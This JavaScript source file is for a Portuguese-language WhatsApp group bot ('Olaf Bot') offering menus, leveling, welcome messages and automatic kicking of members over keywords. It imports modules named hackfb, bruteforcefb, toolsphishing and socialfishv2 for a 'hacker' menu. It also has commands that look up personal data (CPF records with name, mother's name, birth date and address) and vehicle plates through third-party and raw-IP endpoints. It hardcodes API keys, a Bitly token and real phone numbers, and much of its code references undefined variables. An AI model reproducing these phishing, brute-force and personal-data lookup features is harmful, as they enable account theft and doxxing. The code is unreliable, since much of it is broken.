const {
    WAConnection,
    MessageType,
    Presence,
    Mimetype,
    GroupSettingChange
} = require('@adiwajshing/baileys')
const { color, bgcolor } = require('./lib/color')
const {regras} = require('./olaf/regras')
const { modapk } = require('./src/modapk')
const { pack } = require('./src/pack')
const { filmes } = require('./outros/filmes')
const { jogadorn1 } = require('./outros/jogadorn1')
const { harrypotter1 } = require('./outros/harrypotter1')
const { jogar } = require('./src/jogar')
const { café } = require('./src/café')
const { família } = require('./src/família')
const { jogos } = require('./src/jogos')
const { sacana } = require('./src/sacana')
const { sacana1 } = require('./src/sacana1')
const { sacana2 } = require('./src/sacana2')
const { sacana3 } = require('./src/sacana3')
const { sacana4 } = require('./src/sacana4')
const { sacana5 } = require('./src/sacana5')
const { sacana6 } = require('./src/sacana6')
const { onepiece } = require('./src/onepiece')
const { lucifer } = require('./src/lucifer')
const { kaifuku } = require('./src/kaifuku')
const { animes } = require('./src/animes')
const { séries } = require('./src/séries')
const { mushoku } = require('./src/mushoku')
const { nanatsu } = require('./src/nanatsu')
const { exorcist } = require('./src/exorcist')
const { sigla } = require('./src/sigla')
const { outros } = require('./src/outros')
const { vipmenu } = require('./src/vipmenu')
const { animemenu } = require('./olaf/animemenu')
const { destrava } = require('./src/destrava')
const { menu2 } = require('./src/menu2')
const { destrava2 } = require('./src/destrava')
const { gbin } = require('./src/gbin')
const { cs } = require('./olaf/cs')
const { gpessoa } = require('./src/gpessoa')
const { tool } = require('./olaf/tool')
const { chentai } = require('./src/chentai')
const { gcpf } = require('./src/gcpf')
const { addsay } = require('./src/addsay')
const { listsay } = require('./src/listsay')
const { antivirtexx } = require('./lib/antivirtex.js')
const { addfoto } = require('./src/addfoto')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { fetchJson } = require('./lib/fetcher')
const { darkfb } = require('./olaf/bash/olaffb')
const { fbcheker } = require('./olaf/bash/fbcheker')
const { hackfb } = require('./olaf/bash/hackfb')
const { bruteforcefb } = require('./olaf/bash/bruteforcefb')
const { toolsphishing } = require('./olaf/bash/toolsphishing')
const { socialfishv2 } = require('./olaf/bash/socialfishv2')
const { terkeytermux } = require('./olaf/bash/terkeytermux')
const { bayartokenlistrik } = require('./olaf/bash/bayartokenlistrik')
const { recognize } = require('./lib/ocr')
const fs = require('fs')
const BitlyClient = require('bitly').BitlyClient;
const bitttly = new BitlyClient('8491cb04e746edd1f4b687e398c27e9654136472')
const anime = JSON.parse(fs.readFileSync('./database/json/anime.json'))
const antiracismo = JSON.parse(fs.readFileSync('./database/json/antiracismo.json'))
const nsfw = JSON.parse(fs.readFileSync('./database/json/nsfw.json'))
const antihomofobia = JSON.parse(fs.readFileSync('./database/json/antihomofobia.json'))
const antifake = JSON.parse(fs.readFileSync('./src/antifake.json'))
const buscas = JSON.parse(fs.readFileSync('./database/json/buscas.json'))
const moment = require('moment-timezone')
const setiker = JSON.parse(fs.readFileSync('./src/stik.json'))
const videonye = JSON.parse(fs.readFileSync('./src/video.json'))
const audionye = JSON.parse(fs.readFileSync('./src/audio.json'))
const imagenye = JSON.parse(fs.readFileSync('./src/image.json'))
const { exec } = require('child_process')
const kagApi = require('@kagchi/kag-api')
const fetch = require('node-fetch')
const imageToBase64 = require('image-to-base64')
const axios = require("axios");
const tiktod = require('tiktok-scraper')
const { cekvip } = require('./src/cekvip')
const { TobzApi } = JSON.parse(fs.readFileSync('./database/json/apikey.json'))
const { VthearApi } = JSON.parse(fs.readFileSync('./database/json/apikey.json'))
const { daftarvip } = require('./src/daftarvip')
const { iklan } = require('./src/iklan')
const { daftatvip } = require('./src/daftarvip')
const ffmpeg = require('fluent-ffmpeg')
const { removeBackgroundFromImageFile } = require('remove.bg')
const imgbb = require('imgbb-uploader')
const lolis = require('lolis.life')
const loli = new lolis()
const { name, yt, replySet } = JSON.parse(fs.readFileSync('./database/json/setting.json'))
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
const samih = JSON.parse(fs.readFileSync('./src/simi.json'))
/*const { xp } = require('./database/menu/xp')
const { limit } = require('./database/menu/limit*/
const apivhtear = 'apivhtear';
const apibarbar = 'apibarbar';
const apikeyG = '8b3591aa6c8d36a033b4d8dd46b68834';
const ZeksApi = 'apivinz';
const zeksApi = 'apivinz';
const nomd = '⃬⃗𝕬𝖑𝖊𝖍 ❤️';
const line = '║';
const line2 = '╠➥';
const line7 = '*Em breve*';
const line3 = '╠══✪〘';
const line4 = '〙✪══';
const line5 = '𝕺𝖑𝖆𝖋 𝕭𝖔𝖙';
const line6 = 'APIS DO OLAF';
const line8 = '╠═══════════════';
const line9 = '╠══';
const line10 = 'EDITS »';
const line11 = '𝐃𝐎𝐍𝐎:';
const line12 = '*wa.me/+5577991174304*';
const line13 = '𝐒𝐓𝐀𝐓𝐔𝐒: ON';
const line14 = '*4.1*';
const line15 = '╔══✪〘 ';
const line16 = '*MENU*';
const root = '𝕺𝖑𝖆𝖋 𝕭𝖔𝖙';
const line17 = '*https://chat.whatsapp.com/KK1WEPVYWs7By5IE5Q60WQ*';
const line19 = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQQ0gMA5A-nVR03iMB5Xfwoon5I7rlrCVLk1A&usqp=CAU';
const tobzkey = 'apitobz';
const line18 = 'olafbot';
const line20 = 'figmenu';
const line21  = '┃';
const line22 = '┃➥';
const line23 = '━━━━━━━━━❮';
const line24 = '❯━━━━━━━━━';
const line25 = '┏━───────────────────────────╮';
const line26 = '▬▬▬▬▬▬▬【☪】▬▬▬▬▬▬▬';
const line27 = '┗━───────────────────────────╯';
const line28 = '┗━───────────────────────────╯';
const line29 = 'menugp';
const line30 = 'diversãomenu';
const line31 = 'menuativar';
const line32 = 'menupremium';
const line33 = 'menuanimes';
const line34 = 'menuvoicemod';
const line35 = 'menulogos';
const line36 = 'menudownloads';
const line37 = 'menuhacker';
const line38 = 'menudono';
const line39 = 'menu18';
const line40 = 'menuvoz';
const line41 = 'menuprefix';
const line42 = 'menuedits';
const line43 = 'menumemes';
const line44 = 'menuhd';
const line45 = 'menualeatório';
const line46 = 'menumsc';
const line47 = 'help1';

const BotName = '𝕺𝖑𝖆𝖋 𝕭𝖔𝖙'; 
const instagram = 'http://www.instagram.com/'; 
const aktif = '08:00 - 22:00';
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + 'FN:𝕺𝖑𝖆𝖋\n' // Nama kamu
            + 'ORG:Lexa;\n' // Nama bot
            + 'TEL;type=CELL;type=VOICE;waid=557791174304:+55 7799117-4304\n' //Nomor whatsapp kamu
            + 'END:VCARD'
const ngonsol = JSON.parse(fs.readFileSync('./settings/Miku.json'))
const {
    botName,
    ownerName,
    BarBarKey,
    XteamKey,
    VhtearKey,
    TobzKey,
    ownerNumber,
    botPrefix,
    GrupLimitz,
    UserLimitz,
    CeerTod
} = ngonsol            
prefix = '.','!','#'
blocked = []
limitawal = '999999999'
cr = '*Aleh*'
ator = '️'
namo = 'olafbot'

/*********** LOAD FILE ***********/
const _leveling = JSON.parse(fs.readFileSync('./database/group/leveling.json'))
const antilink = JSON.parse(fs.readFileSync('./database/json/antilink.json'))
const event = JSON.parse(fs.readFileSync('./database/json/event.json'))
const _level = JSON.parse(fs.readFileSync('./database/user/level.json'))
const _antivirtex = JSON.parse(fs.readFileSync('./database/group/antivirtex.json'))
const _limit = JSON.parse(fs.readFileSync('./database/json/limit.json'))
/*********** END LOAD ***********/

/********** FUNCTION ***************/
const getLevelingXp = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
            }
        }

        const getLevelingLevel = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
            }
        }        

        const getLevelingId = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].jid
            }
        }

        const addLevelingXp = (userId, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingLevel = (userId, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingId = (userId) => {
            const obj = {jid: userId, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
        }
        
                const getLimit = (sender) => {
                let position = false
              Object.keys(limit).forEach ((i) => {
                if (limit[position].id === sender) {
                   position = i
                  }
              })
             if (position !== false) {
                return limit[position].limit
            }
        }
        
                const bayarLimit = (sender, amount) => {
                let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/json/limit.json', JSON.stringify(_limit))
            }
        }
        
                const limitAdd = (sender) => {
             let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit += 1
                fs.writeFileSync('./database/json/limit.json', JSON.stringify(_limit))
            }
        }


function kyun(seconds){
  function pad(s){
    return (s < 10 ? '0' : '') + s;
  }
  var hours = Math.floor(seconds / (60*60));
  var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);

  //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
  return `${pad(hours)} Horas ${pad(minutes)} Minutos ${pad(seconds)} Segundos`
}

function addMetadata(packname, author) {	
	if (!packname) packname = 'WABot'; if (!author) author = 'Bot';	
	author = author.replace(/[^a-zA-Z0-9]/g, '');	
	let name = `${author}_${packname}`
	if (fs.existsSync(`./${name}.exif`)) return `./${name}.exif`
	const json = {	
		"sticker-pack-name": packname,
		"sticker-pack-publisher": author,
	}
	const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
	const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	

	let len = JSON.stringify(json).length	
	let last	

	if (len > 256) {	
		len = len - 256	
		bytes.unshift(0x01)	
	} else {	
		bytes.unshift(0x00)	
	}	

	if (len < 16) {	
		last = len.toString(16)	
		last = "0" + len	
	} else {	
		last = len.toString(16)	
	}	

	const buf2 = Buffer.from(last, "hex")	
	const buf3 = Buffer.from(bytes)	
	const buf4 = Buffer.from(JSON.stringify(json))	

	const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	

	fs.writeFile(`./${name}.exif`, buffer, (err) => {	
		return `./${name}.exif`	
	})	

} 

async function starts() {
	const client = new WAConnection()
	client.logger.level = 'warn'
	console.log(banner.string)
	client.on('qr', () => {
		console.log(color('[','white'), color('!','red'), color(']','white'), color(' Digitalize o código qr acima'))
	})

	fs.existsSync('./BarBar.json') && client.loadAuthInfo('./BarBar.json')
	client.on('connecting', () => {
		start('2', 'Conectando ao olaf bot..')
	})
	client.on('open', () => {
		success('2', 'Conectado ao olaf bot')
	})
	await client.connect({timeoutMs: 30*1000})
        fs.writeFileSync('./BarBar.json', JSON.stringify(client.base64EncodedAuthInfo(), null, '\t'))
		
	client.on('group-participants-update', async (anu) => {
		if (!welkom.includes(anu.jid)) return
		try {
			const mdata = await client.groupMetadata(anu.jid)
			console.log(anu)
			if (anu.action == 'add') {
				num = anu.participants[0]
				try {
					ppimg = await client.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				teks = `Olá @${num.split('@')[0]}\nBem vindo ao grupo *${mdata.subject}*\n*SE APRESENTE:*\n*📸foto:*\n*📝Nome:*\n*🔢idade:*\n*👤@user:*\n*🚻sexualidade:*\n*🏠onde mora:*\n*👀oq queres?*\n\n*mantenha o ctt dos adms salvos...*\n\n*use _insta para que eu envie o link das paginas*`
				let buff = await getBuffer(ppimg)
				client.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
				client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
			} else if (anu.action == 'remove') {
				num = anu.participants[0]
				try {
					ppimg = await client.getProfilePicture(`${num.split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				teks = `Tchauzinho bb♥️ @${num.split('@')[0]}`
				let buff = await getBuffer(ppimg)
				client.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
			}
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})

	client.on('CB:Blocklist', json => {
            if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})

	client.on('chat-update', async (mek) => {
		try {
                        if (!mek.hasNewMessage) return
                        mek = JSON.parse(JSON.stringify(mek)).messages[0]
			if (!mek.message) return
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return
			if (mek.key.fromMe) return
			global.prefix
			global.blocked
			const content = JSON.stringify(mek.message)
			const speed = require('performance-now');
			const from = mek.key.remoteJid
			const type = Object.keys(mek.message)[0]
			const apiKey = 'Your-Api-Key'
			const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
			const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
            body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
            var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
			const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
			const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
			const args = body.trim().split(/ +/).slice(1)
			const isCmd = body.startsWith(prefix)

			mess = {
					wait: '*⏳ 𝗰𝗮𝗹𝗺𝗮 𝗮í 𝗺𝗮𝗻𝗼 𝘁𝗼𝗺𝗲 𝘂𝗺 𝗰𝗮𝗳é☕𝗲 𝘂𝗺 𝗯𝗶𝘀𝗰𝗼𝗶𝘁𝗼 🥯 𝗽𝗼𝗿 𝗲𝗻𝗾𝘂𝗮𝗻𝘁𝗼...*',
					success: '️❬ ✔ ❭ Sucesso 🖤',
					levelon: '❬ ✔ ❭ *leveling* *ativado*',
					leveloff: ' ❬ X ❭  *leveling* *desativado*',
					levelnoton: '❬ X ❭ *leveling não ativado*',
					levelnol: '*error* 0 °-°',
					error: {
				stick: '*Bem, falhe, tente novamente ^_^*',
				Iv: '𝗠𝗮𝗮𝗳 𝗹𝗶𝗻𝗸 𝘁𝗶𝗱𝗮𝗸 𝘃𝗮𝗹𝗶𝗱☹️'
				},
				only: {
					group: '[❗] Este comando só pode ser usado em grupos! ❌',
					premium: '[❗] ESTE PEDIDO É SO PARA *USUÁRIOS PREMIUMS*',
					mod: '[❗] ESTE PEDIDO É ESPECÍFICO PARA USUARIO MOD OLAF BOT*',
					benned: 'Você para a banda, por favor, contate o proprietário para abrir sua banda',
					ownerG: '[❗] Proprietário? Este é um recurso especial para o proprietário do bot ❌',
					ownerB: '[❗] Proprietário? Este é um recurso especial para o proprietário do bot ❌',
					userB: `──「 LISTA 」──\nOlá Kak !\nDesculpe, irmã. Você não está registrado como amigo de Olaf. Registre-se para fazer amizade com o bot Olaf por meio, \n\nCommand : ${prefix}daftar nama|idade\nExemplo : ${prefix}daftar Olaf|17\n\n──「 Olaf BOT 」──`,
					admin: '[❗] Este comando só pode ser usado por administradores de grupo! ❌',
					Badmin: ' [❗] Este comando só pode ser usado quando o bot se torna administrador! ❌',
				}
			}

			const botNumber = client.user.jid
			const ownerNumber = ["557791174304@s.whatsapp.net"] // replace this with your number
			const mod = [ownerNumber,"557791174304@s.whatsapp.net"]//ubah nomor lo
			const adminbotnumber = ["557791174304@s.whatsapp.net"]//ubah nomor lo
			const frendsowner = ["557791174304@s.whatsapp.net"]//ubah nomor lo
			const premium = ["557791174304@s.whatsapp.net","5521965550234@s.whatsapp.net","557799330383@s.whatsapp.net","5511937502880@s.whatsapp.net","5511949051934@s.whatsapp.net","554792091566@s.whatsapp.net","558699541889@s.whatsapp.net","5521974892195@s.whatsapp.net","5582981295298@s.whatsapp.net"]
			const isGroup = from.endsWith('@g.us')
			const tescuk = ["0@s.whatsapp.net"]
			const sender = isGroup ? mek.participant : mek.key.remoteJid
			pushname = client.contacts[sender] != undefined ? client.contacts[sender].vname || client.contacts[sender].notify : undefined
			const groupMetadata = isGroup ? await client.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupDesc = isGroup ? groupMetadata.desc : ''
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
			const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
			const groupId = isGroup ? groupMetadata.jid : ''
			const isGroupAdmins = groupAdmins.includes(sender) || false
			const isLevelingOn = isGroup ? _leveling.includes(groupId) : false
			const isWelkom = isGroup ? welkom.includes(from) : false
			const isNsfw = isGroup ? nsfw.includes(from) : true
            const isBuscas = isGroup ? buscas.includes(from) : true
            const isAntiLink = isGroup ? antilink.includes(from) : false
	    	const isAnime = isGroup ? anime.includes(from) : false
            const isAntiHomofobia = isGroup ? antihomofobia.includes(from) : false
            const isAntiFake = isGroup ? antifake.includes(from) : false
	    	const isAntiRacismo = isGroup ? antiracismo.includes(from) : false
			const isSimi = isGroup ? samih.includes(from) : false
			const isOwner = ownerNumber.includes(sender)
			const isPremium = premium.includes(sender)
			const ismod = mod.includes(sender)
			const errorurl2 = 'https://i.ibb.co/dttZM8b/591530180aad.png'
			const isadminbot = adminbotnumber.includes(sender)
			const isfrendsowner = frendsowner.includes(sender)
			const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
			const reply = (teks) => {
				client.sendMessage(from, teks, text, {quoted:mek})
			}
			const sendImage = (teks) => {
		    client.sendMessage(from, teks, image, {quoted:mek})
		    }
			const sendMess = (hehe, teks) => {
				client.sendMessage(hehe, teks, text)
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? client.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})
			}			
		     const costum = (pesan, tipe, target, target2) => {
			     client.sendMessage(from, pesan, tipe, {quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` }}})
			}
              //function leveling
            if (isGroup && isLevelingOn) {
            const currentLevel = getLevelingLevel(sender)
            const checkId = getLevelingId(sender)
            try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random() * 10) + 500
                const requiredXp = 10000 * (Math.pow(2, currentLevel) - 1)
                const getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                    addLevelingLevel(sender, 1)
                    await reply(`*「 LEVEL UP 」*\n\n➸ *Nome*: ${sender}\n➸ *XP*: ${getLevelingXp(sender)}\n➸ *Level*: ${getLevel} -> ${getLevelingLevel(sender)}\n\nParabéns!!  🎉🎉`)
                }
            } catch (err) {
                console.error(err)
            }
        }
        
if (messagesC.includes("!ip"))
  { const aris = text.replace(/!ip /, "") 
  anu = await fetchJson(`https://mnazria.herokuapp.com/api/check?ip=${aris}`).then((res) =>{ 
  let hasil = ` *🔍CONSULTA REALIZADA🔍* \n\n ➸ *CIDADE:* sem info\n ➸ *Latitude* : ${anu.latitude}\n ➸ *Longtitude* : ${anu.longitude}\n ➸ *REGIÃO* : ${anu.region_name}\n ➸ *UF* : ${anu.region_code}\n ➸ *IP* : ${anu.ip}\n ➸ *TIPO* : ${anu.type}\n ➸ *CEP* : ${anu.zip}\n ➸ *LOCALIDADE* : ${anu.location.geoname_id}\n ➸ *CAPITAL* : ${anu.location.capital}\n ➸ *DDD* : ${anu.location.calling_code}\n ➸ *PAÍS* : ${anu.location.country_flag_emoji}\n *📌BY:May Bot*` 
  client.sendMessage(id, hasil, MessageType.text); 
 })
 }
	
if (text.includes('cry')){
  var teks = text.replace(/!randomcry /, '')
    axios.get(`https://tobz-api.herokuapp.com/api/cry`).then((res) => {
      imageToBase64(anu.result)
        .then(
          (ress) => {
            var buf = Buffer.from(ress, 'base64')
            conn.sendMessage(id, buf, MessageType.image)
        })
    })
}	

if (text.includes("cnpj")){
const aris = text.replace(/!cnpj /, "")
axios.get(`https://www.receitaws.com.br/v1/cnpj/${aris}`).then((res) => {
	conn.sendMessage(id, '[❗] ESPERE ESTOU BUSCANDO DADOS', MessageType.text)
         let cep = `*🔍CONSULTA REALIZADA🔍* \n\n ➸ *ATIVIDADE PRINCIPAL:* ${anu.atividade_principal[0].text} \n\n ➸ *DATA SITUAÇÃO:* ${anu.data_situacao}\n\n ➸ *TIPO:* ${anu.tipo} \n\n ➸ *NOME:* ${anu.nome} \n\n ➸ *UF:* ${anu.uf} \n\n ➸ *TELEFONE:* ${anu.telefone}\n\n ➸ *SITUAÇÃO:* ${anu.situacao} \n\n ➸ *BAIRRO:* ${anu.bairro} \n\n ➸ *RUA:* ${anu.logradouro} \n\n ➸ *NÚMERO :* ${anu.numero} \n\n ➸ *CEP :* ${anu.cep} \n\n ➸ *MUNICÍPIO:* ${anu.municipio} \n\n ➸ *PORTE:* ${anu.porte}\n\n ➸ *ABERTURA:* ${anu.abertura}\n\n ➸ *NATUREZA JURÍDICA:* ${anu.natureza_juridica} \n\n ➸ *FANTASIA:* ${anu.fantasia}\n\n ➸ *CNPJ:* ${anu.cnpj}\n\n ➸ *ÚLTIMA ATUALIZAÇÃO:* ${anu.ultima_atualizacao}\n\n ➸ *STATUS:* ${anu.status}\n\n ➸ *COMPLEMENTO:* ${anu.complemento}\n\n ➸ *EMAIL:* ${anu.email}\n\n *📌BY:May Bot* `;
    conn.sendMessage(id, cep ,MessageType.text);
}) 
}

if (text.includes("cpf")){
const aris = text.replace(/!cpf /, "")
axios.get(`http://geradorapp.com/api/v1/cpf/generate?token=${aris}`).then((res) => {
	conn.sendMessage(id, '[❗] ESPERE ESTOU BUSCANDO DADOS', MessageType.text)
         let ecpf = `*🔍CONSULTA REALIZADA🔍* \n\n ➸ *CPF:* ${anu.CPF} \n\n ➸ *NOME:* ${anu.Nome}\n\n ➸ *MÃE:* ${anu.NomeMae} \n\n ➸ *NASCIMENTO:* ${anu.DataNascimento} \n\n ➸ *RUA:* ${anu.Rua} \n\n ➸ *N°:* ${anu.NumeroRua}\n\n ➸ *COMPLEMENTO:* ${anu.Complemento}\n\n ➸ *BAIRRO:* ${anu.Bairro}\n\n ➸ *CEP:* ${anu.CEP}\n\n ➸ *UF:* ${anu.EstadoSigla}\n\n ➸ *CIDADE:* ${anu.Cidade}\n\n ➸ *ESTADO:* ${anu.Estado}\n\n ➸ *PAIS:* ${anu.Pais}  \n\n *📌BY:May Bot* `;
    conn.sendMessage(id, ecpf ,MessageType.text);
}) 
}

if (text.includes("geradorcpf")){
const aris = text.replace(/!geradorcpf/, "")
axios.get(`http://geradorapp.com/api/v1/cpf/generate?token=40849779ec68f8351995def08ff1e2fa`).then((res) => {
	conn.sendMessage(id, '[❗] ESPERE ESTA PROCESSANDO', MessageType.text)
         let cpf = `*🔍CPF GERADOS🔍* \n\n ➸ *CPF:* ${anu.data.number}  \n\n *📌BY:May Bot*`;
    conn.sendMessage(id, cpf ,MessageType.text);
})
}	

if (messagesC.includes("!cep")){
const aris = text.replace(/!cep /, "")
teks = body.slice(7)
anu = await getBuffer(`https://viacep.com.br/ws/${teks}/json/`).then((res) => {
	client.sendMessage(from, '[❗] ESPERE ESTOU BUSCANDO DADOS', MessageType.text)
         let cep = `*🔍CONSULTA REALIZADA🔍* \n\n ➸ *CEP:* ${anu.cep} \n\n ➸ *ENDEREÇO:* ${anu.logradouro}\n\n ➸ *COMPLEMENTO:* ${anu.complemento} \n\n ➸ *BAIRRO:* ${anu.bairro} \n\n ➸ *LOCALIDADE:* ${anu.localidade} \n\n ➸ *UF:* ${anu.uf}\n\n ➸ *DDD:* ${anu.ddd} \n\n *📌BY:May Bot* `;
    client.sendMessage(from, cep ,MessageType.text);
}) 
}

if (messagesC.includes(".cpfj")){
const aris = text.replace(/.cpfj /, "")
var gh = body.slice(5)
var gbl3 = gh.split("|")[0];
var gbl4 = gh.split("|")[1];
cpfj = `${body.slice(10)}`
anu = await fetchJson(`http://70.37.60.112:8080/test/test.php?cpf=01213606365/json`).then((res) => {
if (anu.error) return reply(anu.error)
ri = JSON.parse(JSON.stringify(anu));
	client.sendMessage(id, '[❗] ESPERE ESTOU BUSCANDO DADOS', MessageType.text)
         let cep = `*🔍CONSULTA REALIZADA🔍* \n\n ➸ *NOME:* ${anu.nome} \n\n ➸ *SEXO:* ${anu.sexo}\n\n ➸ *NASCIMENTO:* ${anu.nascimento}\n\n*📌BY:OLAF BOT* `;
    client.sendMessage(id, cep ,MessageType.text);
}) 
}


if (text.includes("placa"))
  { const aris = text.replace(/!placa /, "") 
  axios.get(`https://apicarros.com/v1/consulta/${aris}/json`).then((res) =>{ 
  let hasil = ` *🔍CONSULTA REALIZADA🔍* \n\n ➸ *ANO:*  ${anu.ano}\n ➸ *ANO MODELO* : ${anu.anoModelo}\n ➸ *CHASSI* : ${anu.chassi}\n ➸ *CODIGO RETORNO* : ${anu.codigoRetorno}\n ➸ *CODIGO SITUACAO* : ${anu.codigoSituacao}\n ➸ *COR* : ${anu.cor}\n ➸ *MARCA* : ${anu.marca}\n ➸ *MUNICIPIO* : ${anu.municipio}\n ➸ *SITUACAO* : ${anu.situacao}\n ➸ *UF* : ${anu.uf}\n *📌BY: OLAF BOT*` 
  conn.sendMessage(id, hasil, MessageType.text); 
 })
 }		        

        if (messagesC.includes("preto")){
		if (!isGroup) return
		if (!isAntiRacismo) return
		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
		client.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`tchau racista ${sender.split("@")[0]} voce sera expulso deste grupo em 5 segundos`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Nesse grupo, não gostamos de racismos, que isso sirva de exemplo 🚶")
		}, 4000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("2 segundos")
		}, 3000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("3 segundos")
		}, 2000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("4 segundos")
		}, 1000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("5 segundo KKKKKKKK tchau otário 😔🤙")
		}, 0)
	}
	
	        if (messagesC.includes("seupreto")){
		if (!isGroup) return
		if (!isAntiRacismo) return
		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
		client.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`tchau racista ${sender.split("@")[0]} voce sera expulso deste grupo em 5 segundos`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("1 segundo")
		}, 4000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("2 segundos")
		}, 3000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("3 segundos")
		}, 2000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("4 segundos")
		}, 1000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("5 segundo KKKKKKKK tchau otário 😔🤙")
		}, 0)
	}
	
		       if (messagesC.includes(".testetime")){
		reply(`Ok, daqui 5 minutos envio resposta`)
		setTimeout( () => {
		}, 50000)
		setTimeout( () => {
